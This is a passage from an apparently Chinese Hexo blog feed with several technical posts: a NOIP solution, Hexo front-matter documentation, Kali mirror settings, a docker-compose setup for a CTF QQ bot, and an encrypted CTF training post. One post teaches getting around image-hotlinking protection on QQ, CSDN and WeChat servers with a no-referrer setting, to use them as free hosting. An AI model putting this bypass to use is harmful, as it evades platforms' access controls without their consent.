<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>一个正整数 $n$。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p><strong>【数据范围】</strong></p>
<p>对于 $100%$ 的数据，$1\le k \le 15$。</p>
<p><strong>【题目来源】</strong></p>
<p>NOIP 2002 普及组第一题</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_min_n</span>(<span class="params">k</span>):</span><br><span class="line">    Sn = <span class="number">0</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> Sn &lt;= k:</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">        Sn += <span class="number">1</span> / n</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">result = find_min_n(k)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="题解解释"><a href="#题解解释" class="headerlink" title="题解解释"></a>题解解释</h2><blockquote>
<p>来自ChatGPT</p>
</blockquote>
<p>这段代码是用来寻找一个最小的整数 $n$，使得累加和 $S_n$ 大于给定的整数 $k$。下面是对代码的解释：</p>
<ol>
<li><p><strong><code>find_min_n</code> 函数定义：</strong></p>
<ul>
<li><code>find_min_n</code> 是一个函数，它接受一个整数参数 <code>k</code>。</li>
<li><code>Sn</code> 初始化为 0，表示累加和。</li>
<li><code>n</code> 初始化为 0，表示整数 $n$。</li>
<li>使用 <code>while</code> 循环，不断迭代，直到 $S_n$ 大于给定的整数 $k$。</li>
<li>在每次循环中，<code>n</code> 自增 1，表示考虑下一个分数项 $\frac{1}{n}$。</li>
<li><code>Sn</code> 更新为之前的累加和加上新的分数项 $\frac{1}{n}$。</li>
</ul>
</li>
<li><p><strong>循环条件：</strong></p>
<ul>
<li>循环条件是 <code>Sn &lt;= k</code>，即当累加和小于或等于给定的整数 $k$ 时继续循环。</li>
</ul>
</li>
<li><p><strong>返回结果：</strong></p>
<ul>
<li>一旦 $S_n$ 大于给定的整数 $k$，循环结束，函数返回此时的整数 $n$。</li>
</ul>
</li>
<li><p><strong>输入和输出：</strong></p>
<ul>
<li>使用 <code>input()</code> 获取一个整数输入作为 $k$。</li>
<li>将输入的 $k$ 传递给 <code>find_min_n</code> 函数，得到结果 <code>result</code>。</li>
<li>打印输出 <code>result</code>，即最小的整数 $n$。</li>
</ul>
</li>
</ol>
<p>整体来说，这段代码通过迭代的方式计算累加和 $S_n$ 直到满足条件 $S_n &gt; k$，然后返回最小的整数 $n$。这种方法相比递归更高效，因为避免了递归深度过大的问题。</p>
]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>【白嫖图床】利用各大厂商图片服务器做图床</title>
    <url>/posts/7e5bbd5c.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>今天晚上突然在 QQ 聊天的时候发现的，因为我安装了 QQ 插件，QQ 图片可以直接转链接，于是脑海里萌生一个想法，既然这可以把图片转为链接，可不可以直接拿来当做图床，相比于市面上的小图床，这些大厂几乎没有跑路的可能性，并且没有存储空间的限制。拿来进行博客写作而且对清晰度以及水印无要求的话完全够用。</p>
<p>下面我仔细说来</p>
<p>常见可以托管图片的大厂平台有很多，比如 QQ 空间，QQ，微博，知乎，微信公众号，最右，CSDN，甚至是抖音……</p>
<p>只要是可以托管图片的，都可以拿来用</p>
<p>但是有个问题就是，有些平台做了图片防盗链，这时候需要经过处理才可以引用，而有些没有防盗链，这可以直接拿来用</p>
<p>下面分类介绍</p>
<h2 id="几个平台"><a href="#几个平台" class="headerlink" title="几个平台"></a>几个平台</h2><h3 id="QQ-图片缓存服务器（有防盗链）"><a href="#QQ-图片缓存服务器（有防盗链）" class="headerlink" title="QQ 图片缓存服务器（有防盗链）"></a>QQ 图片缓存服务器（有防盗链）</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gchat.qpic.cn/gchatpic_new/0/0-0-072D3866B4C29929A881EDCDD616FCBE/0"
                     
                ></p>
<h3 id="CSDN-图片服务器（有防盗链）"><a href="#CSDN-图片服务器（有防盗链）" class="headerlink" title="CSDN 图片服务器（有防盗链）"></a>CSDN 图片服务器（有防盗链）</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img-blog.csdnimg.cn/img_convert/e4385c18ded556a08bca113fbc130aa8.jpeg#/"
                     
                ></p>
<h3 id="微信公众号图片服务器（有防盗链）"><a href="#微信公众号图片服务器（有防盗链）" class="headerlink" title="微信公众号图片服务器（有防盗链）"></a>微信公众号图片服务器（有防盗链）</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/USCMTrw0fX0ia3ibf3JOJBicFQtntuPcaLf2bywtZCsZPZhzAzQqEK9dNLlZZxbRlDNwnzzmXJ79c0e4lBiag1PLWA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1"
                     
                ></p>
<h3 id="知乎图片服务器（未做防盗链）"><a href="#知乎图片服务器（未做防盗链）" class="headerlink" title="知乎图片服务器（未做防盗链）"></a>知乎图片服务器（未做防盗链）</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-2f2e04db9d0391bbdbacd369c1e78bdc.webp?source=2c26e567"
                     
                ></p>
<h3 id="最右图片服务器（未做防盗链，但会-4-3）"><a href="#最右图片服务器（未做防盗链，但会-4-3）" class="headerlink" title="最右图片服务器（未做防盗链，但会 4.3）"></a>最右图片服务器（未做防盗链，但会 4.3）</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://web-f01.izuiyou.com../images/webp/id/2341452572/sz/src?auth_key=1707831600-0-0-b19cf47f3c1dd77b4fe883a0b15b5405"
                     
                ></p>
<h3 id="微博图片服务器（未做防盗链，但会-4-3）"><a href="#微博图片服务器（未做防盗链，但会-4-3）" class="headerlink" title="微博图片服务器（未做防盗链，但会 4.3）"></a>微博图片服务器（未做防盗链，但会 4.3）</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://wx1.sinaimg.cn/large/6148b630ly1hkhmvx03moj20q814541f.jpg"
                     
                ></p>
<h2 id="破解分析"><a href="#破解分析" class="headerlink" title="破解分析"></a>破解分析</h2><p>像没有防盗链的（比如上面的最右，微博，知乎），可以在平台方上传图片知乎复制链接直接拿来引用</p>
<p>而做了防盗链的，如果不做一些手段，显示的是这样的图片</p>
<p>（下面两张一样的图，上面来自微博，下面来自知乎）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://wx4.sinaimg.cn/mw690/008zWmpDly1hms5ucr60sj30mq0exq4s.jpg"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-b3cdc8c08aae0e870ce84f93a4395ca1.png"
                     
                ></p>
<details class="blue" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>Folding 测试： 点击查看更多 </summary>
              <div class='content'>
              <p>这时候就需要在你的 HTML 源码中添加下列代码引入</p><div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;never&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>可以通过 inject，必须引入到 head 里面，而不是 body 里面，这行代码的解释如下：</p><blockquote><p>这段代码是在 HTML 文档中的元数据（meta data）部分，用于指定网页的 referrer 策略。referrer 是指用户在浏览器中点击链接时，浏览器发送给目标网页的信息，包括用户当前所在的页面的 URL。通常情况下，referrer 策略用来控制网页如何处理这些信息。</p><p>在这段代码中，<code>&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</code> 指定了 referrer 策略为 “never”，意味着当用户点击该网页上的链接时，浏览器不会发送 referrer 信息给链接指向的目标网页，而是会将 referrer 信息设置为 “no-referrer”。这样做可以增强用户的隐私保护，因为目标网页无法得知用户是从哪个页面跳转而来的。</p></blockquote><p>所以就绕过防盗链了</p>
              </div>
            </details>

<p>由于原方法会导致站点统计等的数据丢失，经过吾爱大佬的解释，可以单独用图片的 img 标签</p>
<p>可以直接给 <code>&lt;img&gt;</code> 标签加上 <code>referrerpolicy = &quot;no-referrer&quot;</code> 的属性，这样就不会影响站点统计。</p>
<p>实际上微博的地址不固定，有时候会 403，知乎是比较稳定的，还有 QQ 直链比较方便</p>
<p>实测知乎可用</p>
<p>QQ 直链，微信公众号，CSDN 绕过后可用</p>
<p>最右微博会遇到 403</p>
]]></content>
      <categories>
        <category>技术教程</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Hexo写作</tag>
        <tag>图床</tag>
        <tag>白嫖小技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>docker部署GZCTF-QQBOT</title>
    <url>/posts/542f29fd.html</url>
    <content><![CDATA[<h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><ol>
<li>Linux 服务器</li>
<li>docker</li>
<li>docker compose</li>
</ol>
<h2 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h2><p>相关链接：<a class="link"   href="https://github.com/MoRan23/GZCTF-BOT-QQ" >MoRan23&#x2F;GZCTF-BOT-QQ: GZCTF 对接的 qq 机器人，基于 NapCat+Nonebot 框架 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>进入 GZBOTGithub 地址，由于服务器对于 Github 的网络连接会偶然连不上，这里使用 docker-compose 部署，Github 的 README 写的很详细了，这里多说几点易错点。</p>
<ol>
<li><p>下方监听的赛事名是 GZCTF 的赛事名，<strong>不是赛事序号或赛事 ID</strong>，赛事名叫什么就写什么，比如下图中的赛事名就是 <code>W1ndys的bot测试</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../images/QQbot/GZCTF-BOT/image-20240809195548593.png"
                      alt="image-20240809195548593"
                ></p>
</li>
<li><p>把下面代码参数改好后保存为 <code>docker-compose.yml</code></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &quot;3.7&quot;</span><br><span class="line">services:</span><br><span class="line">  napcat:</span><br><span class="line">    image: mlikiowa/napcat-docker:latest</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;6099:6099&quot;    # 如果端口占用换一个就行</span><br><span class="line">    environment:</span><br><span class="line">      - &quot;ACCOUNT=your_account&quot;  #机器人的qq号</span><br><span class="line">      - &quot;WSR_ENABLE=true&quot;</span><br><span class="line">      - &#x27;WS_URLS=&quot;ws://bot:8988/onebot/v11/ws/&quot;&#x27;</span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;./napcat/app:/usr/src/app/napcat&quot;</span><br><span class="line">      - &quot;./napcat/config:/usr/src/app/napcat/config&quot;</span><br><span class="line">    depends_on:</span><br><span class="line">      - bot</span><br><span class="line"></span><br><span class="line">  bot:</span><br><span class="line">    image: registry.cn-hangzhou.aliyuncs.com/moran233/nn:GZBOT</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - &quot;SEND_LIST=xxxxxxx&quot; #监听qq群号</span><br><span class="line">      - &#x27;GAME_LIST=&quot;xxxxx&quot;&#x27; #监听赛事名</span><br><span class="line">      - &quot;GZCTF_URL=xxxxxx&quot; #GZCTF网址</span><br><span class="line">      - &quot;GZ_USER=xxxxxx&quot; #GZCTF管理员用户名</span><br><span class="line">      - &quot;GZ_PASS=xxxxxxx&quot; #GZCTF管理员密码</span><br><span class="line">      - &#x27;SUPER=&quot;xxxxxxx&quot;&#x27; #机器人管理员qq号</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>在当前目录执行（如果你是旧版 docker，可能需要加个短线 <code>docker-compose up -d</code>）</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>查看 <code>NapCatQQ</code> 的 docker 日志，如果 <strong>查不到</strong>，先看一下自己的容器名称，以你自己实际容器名称为准，扫二维码登录 QQ 账号</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs napcat</span><br></pre></td></tr></table></figure></div></li>
</ol>
<blockquote>
<p>测试发现，两个容器有主从关系，我打算直接引入现有的 NapCatQQ 没成功，有师傅成功了可以借鉴一下</p>
</blockquote>
<h2 id="查看日志测试"><a href="#查看日志测试" class="headerlink" title="查看日志测试"></a>查看日志测试</h2><p>这是 <code>赛事机器人</code> 的日志</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../images/QQbot/GZCTF-BOT/image-20240809204053173.png"
                      alt="image-20240809204053173"
                ></p>
<p>这是 <code>NapCatQQ</code> 的日志</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../images/QQbot/GZCTF-BOT/image-20240809204210787.png"
                      alt="image-20240809204210787"
                ></p>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>QQbot</tag>
        <tag>QQ机器人</tag>
        <tag>NapCatQQ</tag>
        <tag>nonebot2</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博文中front-matter的用法</title>
    <url>/posts/8217ff3e.html</url>
    <content><![CDATA[<p><a class="link"   href="https://hexo.io/zh-cn/docs/front-matter" >https://Hexo.io/zh-cn/docs/front-matter<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="Front-matter"><a href="#Front-matter" class="headerlink" title="Front-matter"></a>Front-matter</h1><p>Front-matter 是文件最上方以 <code>---</code> 分隔的区域，用于指定个别文件的变量，举例来说：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">date: 2013/7/13 20:46:25</span><br><span class="line">---</span><br></pre></td></tr></table></figure></div>

<p>以下是预先定义的参数，您可在模板中使用这些参数值并加以利用。</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
<th align="left">默认值</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>layout</code></td>
<td align="left">布局</td>
<td align="left"><a href="https://hexo.io/zh-cn/docs/configuration#%E6%96%87%E7%AB%A0"><code>config.default_layout</code></a></td>
</tr>
<tr>
<td align="left"><code>title</code></td>
<td align="left">标题</td>
<td align="left">文章的文件名</td>
</tr>
<tr>
<td align="left"><code>date</code></td>
<td align="left">建立日期</td>
<td align="left">文件建立日期</td>
</tr>
<tr>
<td align="left"><code>updated</code></td>
<td align="left">更新日期</td>
<td align="left">文件更新日期</td>
</tr>
<tr>
<td align="left"><code>comments</code></td>
<td align="left">开启文章的评论功能</td>
<td align="left"><code>true</code></td>
</tr>
<tr>
<td align="left"><code>tags</code></td>
<td align="left">标签（不适用于分页）</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>categories</code></td>
<td align="left">分类（不适用于分页）</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>permalink</code></td>
<td align="left">覆盖文章的永久链接，永久链接应该以 <code>/</code> 或 <code>.html</code> 结尾</td>
<td align="left"><code>null</code></td>
</tr>
<tr>
<td align="left"><code>excerpt</code></td>
<td align="left">纯文本的页面摘要。使用 <a class="link"   href="https://hexo.io/zh-cn/docs/tag-plugins#%E6%96%87%E7%AB%A0%E6%91%98%E8%A6%81%E5%92%8C%E6%88%AA%E6%96%AD" >该插件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 来格式化文本</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>disableNunjucks</code></td>
<td align="left">启用时禁用 Nunjucks 标签 <code>&#123;&#123; &#125;&#125;</code>&#x2F;<code>&#123;% %&#125;</code> 和 <a class="link"   href="https://hexo.io/zh-cn/docs/tag-plugins" >标签插件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 的渲染功能</td>
<td align="left">false</td>
</tr>
<tr>
<td align="left"><code>lang</code></td>
<td align="left">设置语言以覆盖 <a class="link"   href="https://hexo.io/zh-cn/docs/internationalization#%E8%B7%AF%E5%BE%84" >自动检测<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
<td align="left">继承自 <code>_config.yml</code></td>
</tr>
<tr>
<td align="left"><code>published</code></td>
<td align="left">文章是否发布</td>
<td align="left">对于 <code>_posts</code> 下的文章为 <code>true</code>，对于 <code>_draft</code> 下的文章为 <code>false</code></td>
</tr>
</tbody></table>
<h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><p>根据 <code>_config.yml</code> 中 <a href="https://hexo.io/zh-cn/docs/configuration#%E6%96%87%E7%AB%A0"><code>default_layout</code></a> 的设置，默认布局是 <code>post</code> 。当文章中的布局被禁用(<code>layout: false</code>)，它将不会使用主题处理。然而，它仍然会被任何可用的渲染引擎渲染：如果一篇文章是用 Markdown 写的，并且安装了 Markdown 渲染引擎（比如默认的 <a class="link"   href="https://github.com/Hexojs/Hexo-renderer-marked" >Hexo-renderer-marked<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)，它将被渲染成HTML。</p>
<p>除非通过 <code>disableNunjucks</code> 设置或 <a class="link"   href="https://hexo.io/zh-cn/api/renderer#%E7%A6%81%E7%94%A8-Nunjucks-%E6%A0%87%E7%AD%BE" >渲染引擎<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 禁用，否则无论布局如何，<a class="link"   href="https://hexo.io/zh-cn/docs/tag-plugins" >标签插件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 总是被处理。</p>
<h2 id="分类和标签"><a href="#分类和标签" class="headerlink" title="分类和标签"></a>分类和标签</h2><p>只有文章支持分类和标签，您可以在 Front-matter 中设置。在其他系统中，分类和标签听起来很接近，但是在 Hexo 中两者有着明显的差别：分类具有顺序性和层次性，也就是说 <code>Foo, Bar</code> 不等于 <code>Bar, Foo</code>；而标签没有顺序和层次。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories:</span><br><span class="line">- Diary</span><br><span class="line">tags:</span><br><span class="line">- PS3</span><br><span class="line">- Games</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>分类方法的分歧</p>
<p>如果您有过使用 WordPress 的经验，就很容易误解 Hexo 的分类方式。WordPress 支持对一篇文章设置多个分类，而且这些分类可以是同级的，也可以是父子分类。但是 Hexo 不支持指定多个同级分类。下面的指定方法：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories:</span><br><span class="line">  - Diary</span><br><span class="line">  - Life</span><br></pre></td></tr></table></figure></div>

<p>会使分类 <code>Life</code> 成为 <code>Diary</code> 的子分类，而不是并列分类。因此，有必要为您的文章选择尽可能准确的分类。</p>
<p>如果你需要为文章添加多个分类，可以尝试以下 list 中的方法。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories:</span><br><span class="line">- [Diary, PlayStation]</span><br><span class="line">- [Diary, Games]</span><br><span class="line">- [Life]</span><br></pre></td></tr></table></figure></div>

<p>此时这篇文章同时包括三个分类： <code>PlayStation</code> 和 <code>Games</code> 分别都是父分类 <code>Diary</code> 的子分类，同时 <code>Life</code> 是一个没有子分类的分类。</p>
</blockquote>
<h2 id="JSON-Front-matter"><a href="#JSON-Front-matter" class="headerlink" title="JSON Front-matter"></a>JSON Front-matter</h2><p>除了 YAML 外，你也可以使用 JSON 来编写 Front-matter，只要将 <code>---</code> 代换成 <code>;;;</code> 即可。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;title&quot;: &quot;Hello World&quot;,</span><br><span class="line">&quot;date&quot;: &quot;2013/7/13 20:46:25&quot;</span><br><span class="line">;;;</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>Hexo</category>
        <category>文档</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali如何切换源</title>
    <url>/posts/3073af94.html</url>
    <content><![CDATA[<p>转载  </p>
<p><a class="link"   href="https://blog.csdn.net/fingue/article/details/127096363" >https://blog.csdn.net/fingue/article/details/127096363<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="1、进入vim模式"><a href="#1、进入vim模式" class="headerlink" title="1、进入vim模式"></a>1、进入vim模式</h1><p>sudo su进入root 模式<br>vim &#x2F;etc&#x2F;apt&#x2F;sources.list编辑软件源配置文件</p>
<p>随后进入vim模式</p>
<h1 id="2、国内源"><a href="#2、国内源" class="headerlink" title="2、国内源"></a>2、国内源</h1><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#根据需要自己选一个，中科大的还可以</span><br><span class="line">#中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#浙大</span><br><span class="line">#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#东软大学</span><br><span class="line">#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">#重庆大学</span><br><span class="line">#deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure></div>

<h1 id="3、换源"><a href="#3、换源" class="headerlink" title="3、换源"></a>3、换源</h1><p>按“i”进行编辑</p>
<p>将源插入后，点击“Esc”退出编辑，输入“：wq”回车保存退出，此处插入的是清华大学的源。</p>
<p>注：“#”有注释本行的用途，可以先将原来的源进行注释，再插入新源</p>
<h1 id="4、随后输入下列命令行进行更新"><a href="#4、随后输入下列命令行进行更新" class="headerlink" title="4、随后输入下列命令行进行更新"></a>4、随后输入下列命令行进行更新</h1><p>更新软件列表(非root权限在命令行前加“sudo”)</p>
<p>apt-get update 更新索引</p>
<p>apt-get upgrade 更新软件</p>
<p>apt-get dist-upgrade 升级</p>
<p>apt-get clean 删除缓存包</p>
<p>apt-get autoclean 删除未安装的deb包<br>————————————————<br>版权声明：本文为CSDN博主「不过教资不改名111」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a class="link"   href="https://blog.csdn.net/fingue/article/details/127096363" >https://blog.csdn.net/fingue/article/details/127096363<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>“曲star”网络安全技能竞赛——re方向培训讲解</title>
    <url>/posts/450391f2.html</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="db5fd69b8f5cb876ccb93f10b5ee5db5ff51caf6f732540b5917f6ad75f53674">04c094caff83ee4f17c88aca159bd79177f8ab826a62cda142e1faa450e9fced83f468f62b55d7459963a59c97c19971a7748172fd034bb2345ad82d5d9888168f4f3843b5243eb1e86649af3a869fd09098225ce8081083dbd300641d0aa41e8a9c8c0437028e32ba5f84be9249fa1fe9406ddf18a5dc486138a4110e73c9e9bcf09e7d7da670d729fefe6d1bb8a6d942de8d472a9c07f41ab7093e661675e5465e79d2889fcefb19fdc96b39dad330d0c788d601ddc405d44f482df7b02ed926127e74b3e1c188a4270ecf1ece945ef3c7b85c71363c7f06c510a77486b2c4ec5a8b1444d91f1034db610255918f759c36cc201386a81f23f7979c69b124927f6f6a10a17f431aacf53aed2195502907e3598a9937add19ddcaa602dc37bc192a45bfa6929aa4e975fb30640bcb9dcf83c2a6ba90d84a6ca66cd316f1d91a1f81bff5fe4389256e2d993f6fb46d486a73affd263abf9c427b6fdb6050c789c59369890a24f28c3456efdd02366060fe73567ad417429fa96f076da0606a55ce89f8e5e9029c64ddbf1fd98ffaaf692995f722be1ca4b5953afd7e28dfe054fcd7f01209cf209139a7be02eed2308d3debe026cfa0a05d43143eee56e388b97ea7e395e48f70ad99cadec8711db51d238e2b3f6c494bd2b4eabece8b16323749315b35f9147dce4ad12a7bf1807c5d52d1947280baf07f61dd531ca3d13ef3d10f426113501a7a3d5e060ce834683c63b804dea961c2354ae2973b471f71c0d7d5a0de4ed190636d2df51d93721992ad757a8c6c61db9c8b1795530ec5ef808ca7fa01717ce32f24da3d3134c149654fab00c5880eee993f7cac50be0458107ed33e725b6e423c33b78e7a1c34b3eceea2e8de1ae4dc29fd7c7105f436a3741689bde84887e707e361e7a4d01c3790da06f8a94659b7f5073deb773bbe99568e4092718d0d002687a7bacb98238cea38305b33adcc1586d4c849e653ea20bf6204e3f9dfc0b1109c49f45fde5a7481a4d9184c75ea2e85d980bbdce5fc75584075016d61df83984023dd5c05bb3241cadb3039a3cbd582b689d0cf70cfb851009154925e81f85c127246e2a7653f4b01cc00f7e5ac032e7e64066a64506a2b7ce0b46f7939793b9b93c5f7120fc69d7d9a0bc23e21090de77ac30067bbe801cf596699d5afc44a17613b1c59d3b2467dfaa69517fb18af2d8be5e6179a95e820a406dd03b13ecb94a00b9c64f90a25f09ab6d0901604e06e8ce5fcf5fb62684587de04e9e4f3d099cbbb9c2cd1d9f3baa44d4c5f1a30e4511c45a6e25f957e386df9ef8b4954d438332ab6e8edd50b08340195e3062fdff33324f23a7fee30322ddb26aa315afb097a71871f233eb36e28d9775f3e8571d84329d1f559495d0ab5abe4ee5ada5ef5dbe8797c4efc49724a6a165fc00c476388a01a6bb20d522957337f71e76bd0e0aefd4c7649208277193eb7311702c8e0f2a186b1de6087cffc3c3d90a4e8c00eeceb7e08b3dc67429e5c82e8faa9b7dee549dfa0d2d6c0118ff0867b9e952f5ebecb91a451ace2a576ccee302a136afe7de1a095c597c3a8fd13bdcc8b2f7286c5b53691b69603cf1b06180b402c272cfb00266ee77283a6d4da2dbad2a63883ff403c4dd2dc76c5fd2acb8133e3d9521bbffb7060b533601ee481c8dced3aaa398b1d4938d3e98e90e779397fa491e05351c3198e7dd12d9f96c09f40556dec5e9160169da33ce2f503645edae36236a6b38c1b43ab277c44ecdadd4930f39465e8afe0d13b6cfc0187d64904c0ecffc73fa3497fafaab11e752cd1eea8294d9daf82f3dece730263e73c530f46104e2b255be7ca5f4f667a7872f49815af04132d9370a0e4604dc806e87cce935887bbe0b075b4b6b02e2ffe995b9e100fc2769cf27c3ef8e8a546fb55b34093be8f76edc2a0702e41f2254a114e21a38088e489c53858b6a50c515775fe25f98230dd8242741d4339f60aab991ebc8781e36a8df7c03360d3c460045260fb823d731077128deb41db63938e017925ddb4c8b0ab82931302d0b79e194286845c17a72693507d39a045148d6cf89aa356072ea30d2f46bfec7ffa54b973877d7ab3729873a6ce4a006f5b553a17f75b14f2509aa6add5f5e21f626337c0a96784